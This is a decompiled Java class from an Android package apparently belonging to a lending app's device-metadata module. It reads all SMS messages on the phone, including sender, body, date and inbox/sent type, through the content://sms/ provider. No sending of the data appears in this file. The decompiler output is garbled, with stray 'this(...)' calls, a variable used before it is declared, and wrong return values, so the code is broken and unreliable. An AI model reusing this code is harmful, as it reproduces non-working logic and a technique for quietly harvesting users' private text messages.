package com.cashful.devicemetadata.sms;

import android.app.Activity;
import android.database.Cursor;
import android.net.Uri;
import java.util.ArrayList;

public class SmsInformation {
  private Activity activity;
  
  public SmsInformation(Activity paramActivity) {
    this.activity = paramActivity;
  }
  
  private ArrayList<SmsData> getSms(int paramInt) {
    ArrayList arrayList;
    if ((arrayList = getAllSms()).size() > paramInt) {
      int i = size() - paramInt;
      arrayList = (ArrayList)subList(i, size());
    } else {
      ArrayList arrayList1;
      this(this);
      arrayList = arrayList1;
    } 
    return this;
  }
  
  public ArrayList<SmsData> getAllSms() {
    this();
    ArrayList<SmsData> arrayList;
    Uri uri = Uri.parse("content://sms/");
    this.activity.startManagingCursor(cursor);
    Cursor cursor;
    int i = (cursor = this.activity.getContentResolver().query(uri, null, null, null, null)).getCount();
    if (this.activity.getContentResolver().query(uri, null, null, null, null).moveToFirst())
      for (byte b = 0; b < i; b++) {
        String str6;
        SmsData smsData = new SmsData();
        String str1 = cursor.getString(cursor.getColumnIndexOrThrow("_id"));
        String str2 = cursor.getString(cursor.getColumnIndexOrThrow("address"));
        String str3 = cursor.getString(cursor.getColumnIndexOrThrow("body"));
        String str4 = cursor.getString(cursor.getColumnIndexOrThrow("read"));
        String str5 = cursor.getString(cursor.getColumnIndexOrThrow("date"));
        if (cursor.getString(cursor.getColumnIndexOrThrow("type")).contains("1")) {
          str6 = "inbox";
        } else {
          str6 = "sent";
        } 
        this(str1, str2, str3, str4, str5, str6);
        arrayList.add(smsData);
        cursor.moveToNext();
      }  
    cursor.close();
    if (arrayList.size() > 5) {
      ArrayList arrayList1;
      this();
      for (byte b = 0; b < 5; b++)
        add((E)arrayList.get(b)); 
      return this;
    } 
    return arrayList;
  }
}


/* Location:              C:\Users\ASUZE\Downloads\cryptoe\\upworkclient\classes.jar!\com\cashful\devicemetadata\sms\SmsInformation.class
 * Java compiler version: 8 (52.0)
 * JD-Core Version:       1.1.3
 */